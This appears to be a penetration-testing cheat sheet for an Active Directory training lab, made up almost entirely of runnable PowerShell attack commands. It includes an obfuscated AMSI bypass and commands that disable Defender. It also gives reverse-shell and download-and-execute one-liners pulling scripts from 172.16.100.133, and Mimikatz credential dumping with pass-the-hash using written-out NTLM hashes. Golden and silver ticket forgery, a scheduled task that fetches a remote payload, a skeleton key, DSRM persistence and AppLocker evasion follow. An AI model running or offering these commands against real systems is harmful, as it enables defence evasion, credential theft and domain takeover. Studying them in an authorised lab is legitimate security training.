
#--------------- bypass AMSI/Antivirus/Windows Defender --------------------
powershell -ep bypass
sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

(with admin)
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -disableRealtimeMonitoring $true

#--------------- Find local admin ---------------
. .\Find-PSRemotingLocalAdminAccess.ps1
Find-LocalAdminAccess -Verbose

#--------------- PowerView ---------------
#-----------------------------------------
. .\PowerView.ps1

#----- Find local admin -----
Invoke-EnumerateLocalAdmin -Verbose
Invoke-EnumerateLocalAdmin -Verbose | select computername,accountname

#----- Emuneration basics
Get-NetUser
Get-NetUser | select -ExpandProperty samaccountname
Get-DomainSID
Get-NetComputer
Get-NetComputer -FullData | ?{$_.name -eq "dcorp-adminsrv"}
Get-NetGroup -GroupName "Domain Admins" -FullData
Get-NetGroupMember -GroupName "Domain Admins"
Get-NetGroupMember -GroupName "Enterprise Admins"
Get-NetGroupMember -GroupName "Enterprise Admins" –Domain moneycorp.local
Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC –Verbose
Get-NetOU
Get-NetOU StudentMachines | %{Get-NetComputer -ADSPath $_}
Get-NetGPO

#----- Get GPO of a specific OU ------
Get-NetGPO -ADSpath ((Get-NetOU StudentMachines -FullData).gplink.split(";")[0] -replace "^.")

#----- Get ACL -----
Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs -Verbose
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs -Verbose

#----- Find modify rights/permission for a 'students'
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "student"}
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "RDPUsers"}

#----- Enum Domain Forest and trust
Get-NetForestDomain -Verbose
Get-NetDomainTrust 
Get-NetForestDomain -Verbose | Get-NetDomainTrust

#----- list only External trusts -----
Get-NetForestDomain -Verbose | Get-NetDomainTrust | ?{$_.TrustType -eq 'External'}

#----- Get trust of target forest -----
Get-NetForestDomain -Forest eurocorp.local -Verbose | Get-NetDomainTrust

#--------------- ADModule ---------------
#-----------------------------------------
Import-Module Microsoft.ActiveDirectory.Management.dll 
Import-Module ActiveDirectory.psd1

Get-ADUser -Filter *
Get-ADUser -Filter * -Properties *| select Samaccountname,Description
Get-ADComputer -Filter *
Get-ADGroupMember -Identity 'Domain Admins'
Get-ADGroupMember -Identity 'Enterprise Admins' -Server moneycorp.local
(Get-ADForest).Domains
Get-ADTrust -Filter *
Get-ADForest | %{Get-ADTrust -Filter *}

#----- List only external trusts in target domain -----
(Get-ADForest).Domains | %{Get-ADTrust -Filter '(intraForest -ne $True) -and (ForestTransitive -ne $True)' -Server $_}

#----- Identify external trusts of domain -----
Get-ADTrust -Filter '(intraForest -ne $True) -and (ForestTransitive -ne $True)'
Get-ADTrust -Filter * -Server eurocorp.local


#--------------- PowerUp ---------------
. .\PowerUp.ps1
Get-ServiceUnquoted
Get-ModifiableServiceFile -Verbose
Get-ModifiableService
# ServiceName: AbyssWebServer
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\student133'


#--------------------- GOT LOCAL ADMIN ^^ ------------------
#-----------------------------------------------------------

# Connect to other remote machine using powershell remoting
. .\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess
# dcorp-adminsrv
# Get-NetComputer -FullData | ?{$_.name -eq "dcorp-adminsrv"}
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local

#------ Nishang reverse shell ------
(1) rename function name to something evasive eg. Power
(2) Append Power -Reverse -IPAddress 172.16.100.X -Port 443
(3) Serve Invoke-PowerShellTcp.ps1 for downloading
(4) start nc nvlp 443
(5) Use payload
powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.133/Invoke-PowerShellTcp.ps1'));
or
powershell.exe iex (iwr http://172.16.100.133/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.133 -Port 443

#----- Bloodhound -----
# bloodhound ingestors to gather data
. .\SharpHound.ps1 
(all info)
Invoke-BloodHound -CollectionMethod All -Verbose
(info on established sessions)
Invoke-BloodHound -CollectionMethod LoggedOn -Verbose

#----- Look for machines with logged in Domain Admins -----
iex (iwr http://172.16.100.133/PowerView.ps1 -UseBasicParsing)
Invoke-UserHunter. . 
# Check if theres LocalAdmin for these machines
Invoke-UserHunter -CheckAccess

#----- Invoke-Command -----
Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local

#------------------ Mimikatz ------------------
# disable AV for target session and dump hash
1. iex (iwr http://172.16.100.133/Invoke-Mimikatz.ps1 -UseBasicParsing)
2. $sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
3. Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
4. Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess
# got domain admin ntlm hash
(using elevated shell)
5. Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe"'

#----- Get AES Keys ----
Invoke-Mimikatz -Command '"sekurlsa::ekeys"'

#----- Look for credentials from cred vault -----
Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"

#--- Dump all DC hashes (with DA) ---
1. $sess = New-PSSession -ComputerName dcorp-dc
2. Enter-PSSession $sess
3. bypass AMSI and exit
4. Invoke-Command -FilePath .\Invoke-Mimikatz.ps1 -Session $sess
5. Enter-PSSession $sess
6. Invoke-Mimikatz -Command '"lsadump::lsa /patch"'

#--- GOLDEN TICKET ---
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
(list files to confirm)
ls \\dcorp-dc.dollarcorp.moneycorp.local\c$


#--- SILVER TICKET (need ntlm hash of DC machine account)---
#-----------------------------------------------------------

#----- get reverse shell using scheduled tasks (need HOST) ----
(for HOST service)
1. Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:0ffbc912445882bbafe0c66625d5d538 /user:Administrator /ptt"'

(check if TGS creation success)
schtasks /S dcorp-dc.dollarcorp.moneycorp.local

2. schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "User133" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.133/Callme.ps1''')'"

3. Start webserver to serve powershell

4. start nc listener to catch shell

5. schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "User133"
(for WMI service)

#----- RCE using WMI (need HOST and RPCSS) ----
(for RPCSS)
1. Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:RPCSS /rc4:0ffbc912445882bbafe0cs66625d5d538 /user:Administrator /ptt"'

(for HOST)
2. same as above but replace 'RPCSS' with 'HOST'

(check that both ticket exists)
3. klist

4. gwmi -Class win32_operatingsystem -ComputerName dcorp-dc.dollarcorp.moneycorp.local


#----- SKELETON KEY attack -----
(RUN ONCE only and cannot re-execute this unless DC is rebooted)
1. remote to DC (make sure to disable AMSI and load mimikatz)

2. Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'

(After injecting the skeleton key we can login using password 'mimikatz' )
3. Enter-PSSession -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Credential dcorp\administrator


#----- DSRM Admin -----
(only dump local admin and SAMKEY)
1.  Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'

(modify logon behavior of DSRM admin)
2. New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
(if item exists use "Set-ItemProperty" instead)
Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2

(logon as LOCAL admin for DC machine. Take note of the domain is local machine name. )
3. Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'

(test using)
ls \\dcorp-dc.dollarcorp.moneycorp.local\c$

#------------------ Mimikatz end -----------------------


#----- Check Constaint Language Mode -----
$ExecutionContext.SessionState.LanguageMode ConstrainedLanguage
(constraint mode dont allow run scripts by dot source eg. . ./script.ps1, work around by ammending the scripts)

#----- Check App locker policy (Look for Everyone)-----
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

(look out for Description : Allows members of the Everyone group to run scripts that are located in the Windows folder)

Copy-Item .\Invoke-MimikatzEx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'

(Since theres it is ConstrainedLanguage, append the invoke-mimikatz command in script itself)
.\Invoke-MimikatzEx.ps1





